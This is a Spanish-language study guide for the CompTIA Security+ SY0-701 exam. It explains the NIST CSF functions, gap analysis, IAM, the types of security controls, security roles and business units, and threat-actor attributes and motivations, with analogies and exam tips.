> **Analogía:** Si la seguridad de la información es proteger el "qué" (los datos), la ciberseguridad es proteger el "cómo" (el hardware y software que procesa esos datos).

### Marco del NIST (National Institute of Standards and Technology)

El **NIST** *(National Institute of Standards and Technology)* desarrolló el **CSF** *(Cybersecurity Framework / Marco de Ciberseguridad)* que clasifica las tareas de ciberseguridad en **5 funciones**:

```
NIST CSF — Las 5 Funciones Clave
─────────────────────────────────────────────────────────────
  [IDENTIFICAR] → [PROTEGER] → [DETECTAR] ↔ [RESPONDER] → [RECUPERAR]
                                    ↑_____________________________|
                                    (retroalimentación continua)
─────────────────────────────────────────────────────────────
```

| # | Función | Descripción | Ejemplo |
|---|---|---|---|
| 1 | **Identificar** *(Identify)* | Desarrollar políticas y capacidades. Evaluar riesgos, amenazas y vulnerabilidades. Recomendar controles de mitigación. | Inventario de activos de la empresa |
| 2 | **Proteger** *(Protect)* | Instalar, operar y desmantelar activos de hardware/software con seguridad integrada en cada etapa del ciclo de vida | Cifrado de datos, control de acceso |
| 3 | **Detectar** *(Detect)* | Monitoreo continuo y proactivo para garantizar que los controles sean efectivos y capaces de proteger contra nuevas amenazas | SIEM, IDS |
| 4 | **Responder** *(Respond)* | Identificar, analizar, contener y erradicar amenazas a los sistemas y la seguridad de los datos | Plan de respuesta a incidentes |
| 5 | **Recuperar** *(Recover)* | Implementar resiliencia de ciberseguridad para restaurar sistemas y datos si otros controles no pueden prevenir ataques | Backup y recuperación ante desastres |

> 📌 El NIST CSF es **solo un ejemplo**. Existen **muchos otros marcos de ciberseguridad (CSF)**.

> Referencia oficial: `nist.gov/cyberframework/online-learning/five-functions`

> **👉 Enfoque de Examen SY0-701:**
> Las preguntas sobre el marco NIST suelen ser de escenario: *"Una empresa implementa monitoreo continuo de sus sistemas. ¿A qué función del NIST CSF corresponde?"* → **Detectar**.
> Distractores comunes:
> - Confundir **Responder** con **Recuperar**: Responder = durante/inmediatamente después del incidente; Recuperar = restaurar la normalidad operativa.
> - Confundir **Identificar** con **Detectar**: Identificar es proactivo (políticas, inventarios); Detectar es monitoreo activo.
> - Recuerda que la **retroalimentación** fluye desde Detectar/Responder hacia Identificar.

## 1.1.3 Análisis de Deficiencias (Gap Analysis)

### ¿Por qué se necesitan marcos?

Un **marco de ciberseguridad**:
- Evita construir el programa de seguridad "en el vacío"
- Guía la selección y configuración de controles
- Permite hacer una **declaración objetiva** de las capacidades actuales
- Identifica un **nivel de capacidad objetivo**
- **Prioriza inversiones** para alcanzar ese objetivo
- Proporciona una declaración de **cumplimiento normativo** verificable externamente
- Da estructura a los **procedimientos internos de gestión de riesgos**

> **Analogía:** Un marco de ciberseguridad es como las normas de construcción de edificios: no inventas las reglas de seguridad estructural desde cero; sigues un estándar probado para no olvidar elementos críticos.

### El Análisis de Deficiencias (Gap Analysis)

**Definición:** El **análisis de deficiencias** *(Gap Analysis)* es el proceso que identifica **cómo los sistemas de seguridad de una organización difieren** de los que exige o recomienda un marco de referencia.

**¿Cuándo se realiza?**
- Al adoptar un marco por primera vez
- Al cumplir con un nuevo requisito de cumplimiento industrial o legal
- Periódicamente (cada pocos años) para validar cambios en el marco

> **Analogía:** Es como una revisión técnica de tu coche. El inspector compara el estado actual de tu vehículo con los estándares mínimos de seguridad vial y te dice qué está faltando o mal configurado.

### Informe de Análisis de Deficiencias

Un informe de análisis de deficiencias incluye, **por cada sección del marco**:

| Elemento del Informe | Descripción |
|---|---|
| **Puntuación general** | Nivel de capacidad alcanzado vs. requerido |
| **Lista de controles faltantes** | Controles que no se implementaron |
| **Lista de controles mal configurados** | Controles existentes pero incorrectos |
| **Niveles de riesgo CIA** | Impacto sobre Confidencialidad, Integridad y Disponibilidad |
| **Fecha de remediación objetivo** | Plazo para corregir las deficiencias (ej. Q1, Q3, Q4) |

**Ejemplo real del documento** (función Identificar):

| Función | Controles (Actual/Requerido) | Capacidad | C | I | A | Remediación |
|---|---|---|---|---|---|---|
| Gestión de activos | 4/6 | Intermedia | 6 | 6 | 6 | Q4 |
| Gobernanza | 3/4 | Intermedia | 6 | 6 | 1 | Q3 |
| Evaluación de riesgos | 3/6 | Sin/Básica | 6 | 6 | 3 | Q3 |
| Gestión de identidad y acceso | 5/8 | Intermedia | 9 | 9 | 4 | Q1 |
| Seguridad de datos | 3/8 | Sin/Básica | 9 | 9 | 4 | Q1 |

**¿Quién realiza el análisis?**
- Puede realizarlo el **equipo de seguridad interno**
- Generalmente involucra **consultores externos** (por la complejidad de los marcos y regulaciones)
- Los externos aportan perspectiva fresca y alertan sobre **descuidos y nuevas tendencias**

> **👉 Enfoque de Examen SY0-701:**
> Las preguntas sobre Gap Analysis suelen preguntar *cuál es su propósito* o *cuándo se realiza*. Vigilar:
> - No confundir **Gap Analysis** con **Risk Assessment** (evaluación de riesgos): el Gap Analysis compara contra un marco estándar; el Risk Assessment evalúa amenazas específicas del negocio.
> - El análisis de deficiencias **puede repetirse periódicamente**, no es un proceso de una sola vez.
> - La implicación de **consultores externos** es una característica importante: aportan objetividad.

## 1.1.4 Control de Acceso e IAM

### ¿Qué es el Control de Acceso?

Un **sistema de control de acceso** garantiza que un sistema de información cumpla con los objetivos de la **tríada CIA**.

**Conceptos clave:**

| Término | Definición | Ejemplo |
|---|---|---|
| **Sujeto** | Persona, dispositivo, proceso de software o sistema que solicita acceso | Un usuario, una aplicación, un servidor |
| **Objeto** | El recurso al que se accede | Una red, servidor, base de datos, aplicación, archivo |
| **Derechos/Permisos** | Lo que el sujeto puede hacer sobre el objeto | Leer, escribir, ejecutar, eliminar |


> **Analogía:** Piensa en un edificio de oficinas. Hay empleados (sujetos), hay salas de reuniones, servidores y archivos (objetos). El sistema de tarjetas de acceso determina quién puede entrar dónde: eso es control de acceso.

### IAM — Gestión de Identidades y Accesos

El **IAM** *(Identity and Access Management / Gestión de Identidades y Accesos)* comprende **4 procesos principales**:

```
┌─────────────────────────────────────────────────────────────┐
│                    FLUJO IAM                                │
│                                                             │
│  1. IDENTIFICACIÓN → 2. AUTENTICACIÓN → 3. AUTORIZACIÓN     │
│         ↓                    ↓                  ↓           │
│   Crear cuenta           Verificar          Asignar         │
│   única de usuario       credencial         derechos        │
│                                                             │
│                    4. REGISTRO (AUDITORÍA)                  │
│             (monitorea TODO el proceso)                     │
└─────────────────────────────────────────────────────────────┘
```

| Proceso | Definición | Ejemplo práctico |
|---|---|---|
| **1. Identificación** | Crear una cuenta o ID que represente de forma única al usuario, dispositivo o proceso en la red | Alta de usuario en Active Directory; registro de cliente en e-commerce |
| **2. Autenticación** | Demostrar que un sujeto es quien dice ser al intentar acceder al recurso | Contraseña, certificado digital, huella dactilar |
| **3. Autorización** | Determinar qué derechos tiene el sujeto sobre cada recurso y hacerlos valer | **ACL** *(Access Control List / Lista de Control de Acceso)*: permite o deniega lectura/escritura |
| **4. Registro** | Seguimiento del uso autorizado/no autorizado de recursos; alertas ante intentos de acceso no autorizado | Logs de auditoría, SIEM |

**Modelos de autorización:**
- **Modelo discrecional:** El **propietario del objeto** puede asignar derechos
- **Modelo obligatorio:** Los derechos están **predeterminados por reglas del sistema**; ningún usuario puede cambiarlos

*(Identity and Access Management)*

> **Analogía:** IAM es como el proceso completo de contratación de un empleado: primero se crea su expediente (identificación), luego se verifica quién es con su DNI (autenticación), luego se le asignan las llaves de las salas que necesita (autorización), y finalmente se registra cada vez que entra y sale de cada sala (registro/auditoría).


### Ejemplo Práctico: E-Commerce

Configurando un sitio de comercio electrónico, cada proceso IAM se implementa así:

| Proceso IAM | Implementación en E-Commerce |
|---|---|
| **Identificación** | Verificar que las direcciones de facturación/entrega coincidan; detectar métodos de pago fraudulentos |
| **Autenticación** | Cuentas únicas por cliente; solo el titular puede gestionar pedidos e información de facturación |
| **Autorización** | Solo clientes con métodos de pago válidos pueden realizar pedidos; esquemas de lealtad para ofertas exclusivas |
| **Registro** | Registrar todas las acciones del cliente (garantiza el no repudio: no puede negar haber realizado un pedido) |

> 📌 **Nota:** Los servidores también participan en IAM. Por ejemplo, tu servidor de e-commerce debe **autenticar su identidad** ante los clientes cuando se conectan vía navegador (certificado TLS/HTTPS).

> Los servidores y protocolos que implementan estas funciones también se conocen como **AAA** *(Authentication, Authorization, and Accounting / Autenticación, Autorización y Registro)*.

> **👉 Enfoque de Examen SY0-701:**
> Este es uno de los temas más preguntados. Puntos clave:
> - Diferencia entre **Identificación** (crear identidad) y **Autenticación** (verificar identidad): son pasos distintos y secuenciales.
> - Las **ACL** *(Access Control Lists)* son herramientas de **autorización**, no de autenticación.
> - El término **AAA** (Authentication, Authorization, Accounting) es sinónimo práctico de los pasos 2-4 del IAM; IAM es más amplio porque incluye la **Identificación** (paso 1).
> - Preguntas de escenario típicas: *"Un empleado se autentica en el sistema pero no puede acceder a una carpeta compartida. ¿Qué proceso IAM está fallando?"* → **Autorización** (el usuario está autenticado pero sin permisos sobre ese objeto).
> - El **modelo discrecional** (DAC) vs. **modelo obligatorio** (MAC) son conceptos que CompTIA desarrolla en profundidad en temas posteriores.

---

## 1.2.1 Clasificación de los Controles de Seguridad

### ¿Qué es un Control de Seguridad?

La garantía de información y ciberseguridad se cumple mediante la implementación de **controles de seguridad**.

**Definición:** Un **control de seguridad** es algo diseñado para dar a un sistema o activo de datos las propiedades de:
- **Confidencialidad**
- **Integridad**
- **Disponibilidad**
- **No repudio**

> **Analogía:** Si un banco es el sistema de información, los controles de seguridad son todas las medidas que lo protegen: la cámara acorazada (técnico), los guardias de seguridad (operacional), las cámaras de vigilancia (físico) y las políticas de auditoría interna (gerencial).

### Las 4 Categorías de Controles (por FORMA de implementación)

| Categoría | Descripción | Ejemplos |
|---|---|---|
| **Gerencial** *(Managerial)* | Supervisa el sistema de información. Herramientas que evalúan y seleccionan otros controles de seguridad | Identificación de riesgos, evaluación de riesgos, gestión de políticas |
| **Operacional** *(Operational)* | Implementado **principalmente por personas** | Guardias de seguridad, programas de capacitación, procedimientos manuales |
| **Técnico** *(Technical)* | Aplicado como un **sistema** (hardware, software o firmware) | Cortafuegos *(firewalls)*, software antivirus, modelos de control de acceso del SO |
| **Físico** *(Physical)* | Controles que disuaden y detectan el acceso a **instalaciones y hardware** | Alarmas, puertas de enlace, cerraduras, iluminación, cámaras de seguridad |

> 📌 **Referencia NIST:** El NIST clasifica los controles de seguridad con un esquema diferente pero complementario: `csrc.nist.gov/pubs/sp/800/53/r5/upd1/final` (NIST SP 800-53).

> **Analogía:** Imagina que proteger una joyería requiere: un gerente que diseña el plan de seguridad (gerencial), guardias que patrullan (operacional), alarmas y cámaras (técnico) y cerraduras y rejas físicas (físico).

> **👉 Enfoque de Examen SY0-701:**
> CompTIA combina estas categorías con los tipos funcionales (siguiente sección) en preguntas complejas. Ejemplos típicos:
> - *"Un guardia de seguridad en la entrada del datacenter es un control ___."* → **Operacional Y Físico** (puede tener doble categoría).
> - *"Un firewall configurado para bloquear tráfico no autorizado es un control ___."* → **Técnico**.
> - *"Una política de uso aceptable es un control ___."* → **Gerencial** (algunos también dirían Operacional).
> - Vigilar la distinción entre **Técnico** y **Físico**: las cámaras son **Físico**; el software de monitoreo de red es **Técnico**.

## 1.2.2 Tipos Funcionales de Controles de Seguridad

### Clasificación por FUNCIÓN u OBJETIVO

Los controles se pueden clasificar según **cuándo actúan** y **qué objetivo cumplen**:

> **Analogía temporal:** Piensa en un robo en un museo. Antes del robo: alarma visible en la puerta (preventivo/disuasivo). Durante el robo: cámara que graba y sensor de movimiento (detección). Después del robo: seguro que cubre las pérdidas (correctivo). Si el sistema de alarma falla, hay un guardia humano (compensatorio).

#### Controles Principales (los 3 fundamentales)

| Tipo Funcional | ¿Cuándo actúa? | Descripción | Ejemplos |
|---|---|---|---|
| **Preventivo** *(Preventive)* | **ANTES** del ataque | Elimina o reduce la probabilidad de que un ataque tenga éxito | **ACL** en cortafuegos, software antimalware, gestión de parches proactiva, políticas y **SOP** *(Standard Operating Procedures / Procedimientos Operativos Estándar)* |
| **De Detección** *(Detective)* | **DURANTE** el ataque | No previene el acceso, pero detecta y registra intentos o hechos de intrusión | Logs de auditoría (registros), sistemas IDS *(Intrusion Detection System)*, cámaras de seguridad |
| **Correctivo** *(Corrective)* | **DESPUÉS** del ataque | Elimina o reduce el impacto de una violación de la política de seguridad | Sistemas de **backup** *(copia de seguridad)* que restauran datos dañados, parches aplicados post-incidente |

#### Controles Adicionales (tipos complementarios)

| Tipo Funcional | Descripción | Ejemplos |
|---|---|---|
| **Directivo** *(Directive)* | Impone una **regla de comportamiento**: política, estándar de mejores prácticas o SOP | Contratos de empleados con cláusulas disciplinarias, programas de capacitación y concientización |
| **Disuasivo** *(Deterrent)* | No impide física ni lógicamente el acceso, pero **psicológicamente desalienta** al atacante | Señales de advertencia, avisos de sanciones legales contra intrusión, cámaras visibles |
| **Compensatorio** *(Compensating)* | Sustituto de un control principal que ofrece el **mismo nivel de protección o mejor** usando diferente metodología/tecnología | Segmentación de red para aislar un sistema legado que no puede actualizarse |

### Tabla Comparativa Completa

| Control | ¿Cuándo? | Propósito | Ejemplo clave |
|---|---|---|---|
| **Preventivo** | Antes | Bloquear el ataque | Firewall ACL, antivirus |
| **De Detección** | Durante | Identificar el ataque | Logs, IDS |
| **Correctivo** | Después | Mitigar el daño | Backup y restauración |
| **Directivo** | Siempre | Dictar comportamiento | Políticas, SOP |
| **Disuasivo** | Antes (psicológico) | Desalentar al atacante | Señales de advertencia |
| **Compensatorio** | Siempre | Reemplazar un control principal | Segmentación de red para sistema legado |

### Caso especial: Gestión de Parches

La **gestión de parches** puede ser:
- **Preventivo:** Cuando se aplica **proactivamente** antes de que una vulnerabilidad sea explotada
- **Correctivo:** Cuando se aplica **reactivamente** para remediar una vulnerabilidad conocida después de su descubrimiento

> **👉 Enfoque de Examen SY0-701:**
> Este tema es MUY frecuente en preguntas de escenario con múltiple opción. Las combinaciones más vigiladas:
> - *"Una empresa instala cámaras visibles en la entrada. ¿Qué tipo de control es?"* → **Disuasivo** (y también físico por categoría). Cuidado: si graban activamente, también es **De Detección**.
> - *"Los logs del servidor registran intentos fallidos de login. ¿Qué tipo de control son los logs?"* → **De Detección**.
> - *"Un sistema de backup permite restaurar archivos cifrados por ransomware. ¿Qué tipo de control es?"* → **Correctivo**.
> - *"Un sistema legado no puede parchearse. Se segmenta la red para aislarlo. ¿Qué tipo de control es la segmentación?"* → **Compensatorio**.
> - **Distractor clásico:** El control **Disuasivo** vs. **Preventivo**: disuasivo actúa en la psicología del atacante (no lo bloquea físicamente); preventivo bloquea el ataque técnica o físicamente.
> - La **gestión de parches** puede ser **preventiva O correctiva** dependiendo del contexto: aprende a identificar ambos casos.

## 1.2.3 Funciones y Responsabilidades de Seguridad

### ¿Qué es una Política de Seguridad?

Una **política de seguridad** es una **declaración formalizada** que define cómo se implementará la seguridad dentro de una organización. Describe los medios para proteger la **confidencialidad, disponibilidad e integridad** de los datos y recursos confidenciales.

Una organización que desarrolla políticas de seguridad y usa controles basados en marcos tiene una **postura de seguridad sólida** *(security posture)*.

> **Analogía:** La política de seguridad es como la constitución de una empresa: es el documento fundamental que define cómo se protegen los activos y cuáles son las reglas del juego para todos.

### Jerarquía de Roles y Responsabilidades

```
┌────────────────────────────────────────────────────────────┐
│              JERARQUÍA DE RESPONSABILIDAD                  │
│                                                            │
│  ┌──────────────────────────────────┐                      │
│  │  CIO (Chief Information Officer) │ ← Responsabilidad    │
│  │  CTO (Chief Technology Officer)  │   general de TI      │
│  └──────────────────┬───────────────┘                      │
│                     │                                      │
│  ┌──────────────────▼───────────────┐                      │
│  │  CSO (Chief Security Officer)    │ ← Seguridad interna  │
│  │  CISO (Chief Info. Sec. Officer) │   (org. grandes)     │
│  └──────────────────┬───────────────┘                      │
│                     │                                      │
│  ┌──────────────────▼───────────────┐                      │
│  │  Gestores de Área                │ ← Ámbito específico  │
│  │  (edificios, web, contabilidad)  │                      │
│  └──────────────────┬───────────────┘                      │
│                     │                                      │
│  ┌──────────────────▼───────────────┐                      │
│  │  Personal Técnico / ISSO         │ ← Implementación     │
│  │  (administradores de sistemas y  │   y monitoreo        │
│  │   redes, especialistas seguridad)│                      │
│  └──────────────────┬───────────────┘                      │
│                     │                                      │
│  ┌──────────────────▼───────────────┐                      │
│  │  Personal No Técnico             │ ← Cumplimiento de    │
│  │  (todos los empleados)           │   política y ley     │
│  └──────────────────────────────────┘                      │
│                                                            │
│  ⚠️ Responsabilidad externa (diligencia debida):          │
│     recae en DIRECTORES y PROPIETARIOS                     │
└────────────────────────────────────────────────────────────┘
```

| Rol | Sigla | Responsabilidad Principal |
|---|---|---|
| **Chief Information Officer** | **CIO** | Responsabilidad general de la función de TI (puede incluir seguridad directa) |
| **Chief Technology Officer** | **CTO** | Uso efectivo de productos y soluciones de TI nuevos y emergentes para objetivos empresariales |
| **Chief Security Officer** | **CSO** | Dirección del departamento de seguridad interno (organizaciones grandes) |
| **Chief Information Security Officer** | **CISO** | Responsabilidad interna específica de seguridad de la información |
| **Information Systems Security Officer** | **ISSO** | Implementación técnica, mantenimiento y monitoreo de la política de seguridad |

> 📌 **Marco NICE del NIST:** La **NICE** *(National Initiative for Cybersecurity Education / Iniciativa Nacional para la Educación en Ciberseguridad)* del NIST categoriza las tareas y funciones laborales dentro de la industria de la ciberseguridad.
> Referencia: `nist.gov/itl/applied-cybersecurity/nice/nice-framework-resource-center`

> **Analogía:** Como en un ejército: el General (CIO/CISO) define la estrategia, los oficiales (gestores) dirigen unidades específicas, los soldados (personal técnico) ejecutan las operaciones, y todos los reclutas (personal no técnico) deben seguir el reglamento.

> **👉 Enfoque de Examen SY0-701:**
> Las preguntas sobre roles preguntan principalmente por la responsabilidad de cada cargo. Puntos a vigilar:
> - **CIO** vs. **CISO**: el CIO tiene responsabilidad general de TI; el CISO se especializa en seguridad de la información.
> - **CSO** vs. **CISO**: en la práctica, ambos pueden tener roles similares, pero el CSO puede abarcar también seguridad física; el CISO es específico de información.
> - **ISSO**: es el nivel técnico de implementación, por debajo del CISO.
> - La responsabilidad externa (legal/diligencia debida) recae en **directores y propietarios**, no solo en el equipo de TI.
> - El marco **NICE del NIST** es el estándar para categorizar roles en ciberseguridad en EE.UU.

## 1.2.4 Competencias de la Seguridad de la Información

### ¿Qué hace un profesional de seguridad de TI?

Los profesionales de TI con responsabilidades en seguridad deben ser competentes en una **amplia gama de disciplinas**: desde diseño de redes y aplicaciones hasta adquisiciones y recursos humanos (**RR. HH.**).

**Actividades típicas del rol:**

- Participar en **evaluaciones de riesgos** y pruebas de sistemas de seguridad y hacer recomendaciones
- Especificar, obtener, instalar y **configurar dispositivos y software seguros**
- Configurar y mantener el **control de acceso** a documentos y los **perfiles de privilegios** de usuario
- Supervisar los **registros de auditoría**, revisar los **privilegios de usuario** y documentar los controles de acceso
- Gestionar la **respuesta y los informes de incidentes** relacionados con la seguridad
- Crear y probar **planes y procedimientos de continuidad del negocio** y **recuperación de desastres**
- Participar en programas de **capacitación y educación** en seguridad

> **Analogía:** Un profesional de seguridad de TI es como un inspector de salud y seguridad en una fábrica: evalúa riesgos, recomienda equipos de protección, instala sistemas de seguridad, supervisa que todo funcione, responde a accidentes y entrena al personal.

> **👉 Enfoque de Examen SY0-701:**
> CompTIA puede preguntar sobre qué actividades corresponden a qué roles. Clave:
> - La **respuesta a incidentes** y la **continuidad del negocio** son competencias del profesional de seguridad, no solo del equipo directivo.
> - La **revisión periódica de privilegios de usuario** (principle of least privilege) es una tarea activa del profesional técnico.
> - Estas competencias conectan directamente con los objetivos del examen SY0-701 en los dominios de Gestión de Riesgos y Operaciones de Seguridad.

## 1.2.5 Unidades de Negocio de Seguridad de la Información

### Unidades organizativas de seguridad

Las siguientes unidades representan la función de seguridad dentro de la jerarquía organizacional:

### SOC — Centro de Operaciones de Seguridad

**Definición:** Un **SOC** *(Security Operations Center / Centro de Operaciones de Seguridad)* es un lugar donde profesionales de seguridad **supervisan y protegen los activos de información críticos** en diversas funciones empresariales:
- Finanzas
- Operaciones
- Ventas
- Marketing
- y otras

**Funciones del SOC:**
- Detección rápida de incidentes
- Respuesta rápida a incidentes
- Supervisión continua de las operaciones de ciberseguridad

**¿Quién usa SOCs?**
- Principalmente **corporaciones grandes** (gobiernos, empresas de atención médica)
- Son difíciles de establecer, mantener y financiar, por lo que no todas las organizaciones los tienen

> **Analogía:** El SOC es como el centro de control de una central eléctrica: un lugar centralizado donde especialistas monitorean en tiempo real todos los sistemas críticos y responden inmediatamente ante cualquier anomalía.

### DevSecOps

**DevOps** *(Development + Operations / Desarrollo y Operaciones)*: cambio cultural que fomenta **mayor colaboración** entre desarrolladores y administradores de sistemas para:
- Crear software más rápido
- Probar software más rápido
- Lanzar software más confiable

**DevSecOps** *(Development + Security + Operations)*: extiende DevOps integrando a **especialistas y personal de seguridad** en el proceso. Principios:

| Concepto | Descripción |
|---|---|
| **Seguridad como consideración primordial** | La seguridad es parte de TODAS las etapas del desarrollo e implementación de software |
| **Desplazamiento a la izquierda** *(Shift Left)* | Las consideraciones de seguridad deben hacerse durante las fases de **requisitos y planificación**, NO injertarse al final |
| **Integración de experiencia en seguridad** | La experiencia en seguridad debe integrarse en cualquier proyecto de desarrollo |
| **Automatización de seguridad** | Las herramientas de seguridad se pueden automatizar a través de código |
| **Operaciones de seguridad como desarrollo** | Las operaciones de seguridad pueden concebirse como proyectos de desarrollo de software |

```
ANTES (Tradicional):
[Requisitos] → [Diseño] → [Desarrollo] → [Pruebas] → [Despliegue] → [Seguridad ❌]

CON DEVSECOPS ("Shift Left"):
[Req. + Seg.] → [Diseño + Seg.] → [Dev. + Seg.] → [Pruebas + Seg.] → [Despliegue + Seg.]
     ↑
  La seguridad se integra desde el INICIO
```

> **Analogía:** Antes, la seguridad era como añadir el airbag a un coche ya fabricado. DevSecOps es integrar el diseño de seguridad desde que se dibuja el primer plano del vehículo.

### CIRT / CSIRT / CERT — Equipo de Respuesta a Incidentes

| Sigla | Significado |
|---|---|
| **CIRT** | *Computer Incident Response Team* — Equipo Especializado de Respuesta a Incidentes Informáticos |
| **CSIRT** | *Computer Security Incident Response Team* — Equipo de Respuesta a Incidentes de Seguridad Informática |
| **CERT** | *Computer Emergency Response Team* — Equipo de Respuesta a Emergencias Informáticas |

> Estas tres siglas describen **el mismo concepto** con nombres alternativos.

**Función principal:**
- Actúa como **punto único de contacto** para la notificación de incidentes de seguridad

**Estructura organizativa:**
- Puede estar a cargo del **SOC** (integrado)
- O puede establecerse como una **unidad de negocio independiente**

## 1.3 Glosario del Tema 01

| Sigla / Término | Significado completo | Descripción breve |
|---|---|---|
| **AAA** | Authentication, Authorization, Accounting | Protocolo/proceso de autenticación, autorización y registro |
| **ACL** | Access Control List | Lista de Control de Acceso: permite/deniega acciones sobre objetos |
| **AIC** | Availability, Integrity, Confidentiality | Alternativa al orden CIA para evitar confusión |
| **CERT** | Computer Emergency Response Team | Equipo de respuesta a emergencias informáticas |
| **CIA** | Confidentiality, Integrity, Availability | Tríada fundamental de la seguridad de la información |
| **CIO** | Chief Information Officer | Director de Sistemas de Información |
| **CIRT** | Computer Incident Response Team | Equipo de respuesta a incidentes informáticos |
| **CISO** | Chief Information Security Officer | Director de Seguridad de la Información |
| **CSF** | Cybersecurity Framework | Marco de Ciberseguridad |
| **CSIRT** | Computer Security Incident Response Team | Equipo de respuesta a incidentes de seguridad informática |
| **CSO** | Chief Security Officer | Director de Seguridad |
| **CTO** | Chief Technology Officer | Director de Tecnología |
| **DevOps** | Development + Operations | Cultura de colaboración entre desarrollo y operaciones |
| **DevSecOps** | Development + Security + Operations | DevOps con seguridad integrada desde el inicio |
| **IAM** | Identity and Access Management | Gestión de Identidades y Accesos |
| **IDS** | Intrusion Detection System | Sistema de Detección de Intrusiones |
| **infosec** | Information Security | Seguridad de la Información |
| **ISSO** | Information Systems Security Officer | Oficial de Seguridad de Sistemas de Información |
| **NICE** | National Initiative for Cybersecurity Education | Iniciativa Nacional para la Educación en Ciberseguridad (NIST) |
| **NIST** | National Institute of Standards and Technology | Instituto Nacional de Estándares y Tecnología (EE.UU.) |
| **RR. HH.** | Recursos Humanos | Departamento de gestión de personal |
| **SIEM** | Security Information and Event Management | Sistema de Gestión de Información y Eventos de Seguridad |
| **SOC** | Security Operations Center | Centro de Operaciones de Seguridad |
| **SOP** | Standard Operating Procedures | Procedimientos Operativos Estándar |
| **TLS** | Transport Layer Security | Protocolo de seguridad para comunicaciones en red (sucesor de SSL) |

---

# 2. Tipos de Amenazas

## 2.1 Actores de Amenazas

### 2.1.1 Vulnerabilidad, Amenaza y Riesgo

| Concepto | Definición | Ejemplos |
|---|---|---|
| **Vulnerabilidad** | Debilidad que puede activarse accidentalmente o explotarse intencionalmente | Hardware/software mal configurado, parches sin aplicar, arquitectura de red mal diseñada, contraseñas débiles, fallas de diseño en SO |
| **Amenaza** | Posibilidad de que alguien/algo explote una vulnerabilidad y viole la seguridad | Puede ser intencional o no intencional |
| **Actor de amenaza** | La persona o cosa que representa la amenaza | También llamado **agente de amenaza** |
| **Vector de amenaza** | La ruta o herramienta usada por el actor de amenaza | Correo electrónico, USB, red, etc. |
| **Riesgo** | Nivel de peligro representado por vulnerabilidades + amenazas | Se calcula como: **Probabilidad × Impacto** |

> **Analogía del mundo real:** Imagina tu casa: una **vulnerabilidad** es que la cerradura de la puerta trasera está rota. La **amenaza** es que un ladrón conoce el barrio y sabe que tu cerradura falla. El **riesgo** es la probabilidad de que ese ladrón entre y el daño que causaría.

#### Fórmula del Riesgo

```
RIESGO = Probabilidad de explotación × Impacto del exploit exitoso
```

```
Vulnerabilidad + Amenaza = ALTO RIESGO (Impacto × Posibilidad)
```

> **👉 Enfoque de Examen SY0-701:**
> CompTIA distingue claramente estos tres términos. Una pregunta típica presentará un escenario y pedirá que identifiques si se describe una vulnerabilidad, una amenaza o un riesgo. **Distractor común:** confundir "actor de amenaza" con "vector de amenaza". Recuerda: el actor ES la persona/entidad; el vector ES el camino/método. También vigila preguntas que pregunten cuándo una vulnerabilidad SE CONVIERTE en riesgo (respuesta: cuando existe una amenaza que puede explotarla).


### 2.1.2 Atributos de los Actores de Amenazas

Las técnicas antiguas se basaban en **firmas conocidas** (como reconocer al ladrón por su foto en el fichero). Las amenazas modernas son sofisticadas y evolucionan, por lo que se requiere crear **perfiles de comportamiento**.

> **Analogía del mundo real:** Así como la policía crea perfiles de delincuentes (¿actúa solo o en banda?, ¿tiene recursos?, ¿está dentro o fuera del sistema?), los equipos de seguridad crean perfiles de actores de amenaza.

#### Los 4 Atributos de Clasificación

**1. Interno / Externo**

| Tipo | Descripción |
|---|---|
| **Externo** | No tiene cuenta ni acceso autorizado al sistema objetivo. Debe infiltrarse (intrusión física o piratería de red). Puede ser remoto o local en su método, pero SIEMPRE se clasifica como externo. |
| **Interno (Insider)** | Se le concedieron permisos en el sistema. Incluye empleados, contratistas y socios comerciales. |

**2. Nivel de Sofisticación / Capacidad**

```
BAJO ──────────────────────────────────────► ALTO
Herramientas básicas    Nuevos exploits    Herramientas no-cibernéticas
disponibles           en SO/apps          (activos políticos/militares)
```

**3. Recursos / Financiamiento**

- **Bajo:** Hacker solitario con herramientas gratuitas
- **Medio:** Grupos con financiamiento propio o criminal
- **Alto:** Patrocinados por **Estados nación** o **crimen organizado** → acceso a herramientas personalizadas, estrategas, diseñadores, codificadores, hackers e ingenieros sociales calificados

**4. Motivación**

*(Se desarrolla en detalle en la sección 2.1.3)*

> **👉 Enfoque de Examen SY0-701:**
> Pregunta frecuente: "¿Un contratista que filtra datos es una amenaza interna o externa?" → **INTERNA** (tiene acceso concedido). Otro distractor clásico: un actor externo que ataca físicamente en el sitio sigue siendo **externo** (el término se refiere al acceso, no al método). CompTIA también puede presentar escenarios sobre ex-empleados: clasificarlos como amenaza interna con conocimiento privilegiado o externa sin acceso vigente, según si se revocaron sus credenciales.

### 2.1.3 Motivaciones de los Actores de Amenazas

> **Analogía del mundo real:** Un ladrón puede robar por necesidad económica, por desafío personal, para vengarse del dueño de la tienda, o por encargo político. La motivación cambia completamente el perfil de riesgo y el tipo de ataque.

#### Clasificación por Estructuración del Ataque

| Tipo | Descripción | Ejemplo |
|---|---|---|
| **Estructurado / Dirigido** | Objetivo específico, planificación deliberada | Banda criminal robando datos financieros de una BD específica |
| **No estructurado / Oportunista** | Sin objetivo específico, aprovecha lo que encuentra | Hacker novato lanzando un gusano de correo masivo |
| **Accidental / No intencional** | Errores, descuidos, sin malicia | Empleado que borra datos por error |

#### Las 3 Estrategias Generales de Ataque (Relación con Tríada CIA)

| Estrategia | Definición | Afecta a... |
|---|---|---|
| **Interrupción del servicio** | Impide que la organización opere con normalidad (sitio web caído, malware que bloquea servidores) | **Disponibilidad** |
| **Exfiltración de datos** | Transfiere una copia de información valiosa sin autorización | **Confidencialidad** |
| **Desinformación** | Falsifica recursos de confianza (sitios web alterados, bots en redes sociales, motores de búsqueda manipulados) | **Integridad** |

#### Tipos de Motivaciones

**Motivaciones Caóticas**

- Objetivo: causar caos, obtener crédito/notoriedad, vandalismo digital
- Ejemplos: desfigurar sitios web, liberar gusanos sin objetivo económico
- También: **ataques de venganza** por parte de empleados/ex-empleados con agravios

**Motivaciones Financieras**

| Táctica | Definición |
|---|---|
| **Chantaje / Blackmail** | Exigir dinero para evitar divulgar información (real o fabricada) |
| **Extorsión** | Exigir pago para detener un ataque activo (ej. ransomware: paga o no recuperas tus datos) |
| **Fraude** | Falsificación de documentos/registros: malversación de fondos, lavado de dinero, noticias falsas para manipular precios de acciones |

**Motivaciones Políticas**

- **Denunciante (Whistleblower):** Motivación ética para divulgar información confidencial sobre malas prácticas
- **Hacktivismo:** Grupos que interrumpen servicios de organizaciones que consideran contrarias a sus valores
